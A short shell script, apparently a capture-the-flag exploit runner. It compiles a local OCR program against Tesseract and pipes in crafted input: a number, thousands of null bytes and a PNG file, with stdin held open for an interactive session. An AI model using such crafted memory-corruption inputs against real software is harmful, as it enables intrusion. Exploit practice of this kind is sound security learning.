#!/bin/sh
export TESSDATA_PREFIX=/home/ubuntu/example/
g++ -o b b.cpp -std=c++11 -I/usr/include/leptonica -I/usr/local/include/tesseract -llept -ltesseract
(python -c 'print "10593"+"\x00"*4091+open("ex.png").read()+"\n"';cat) | ./b

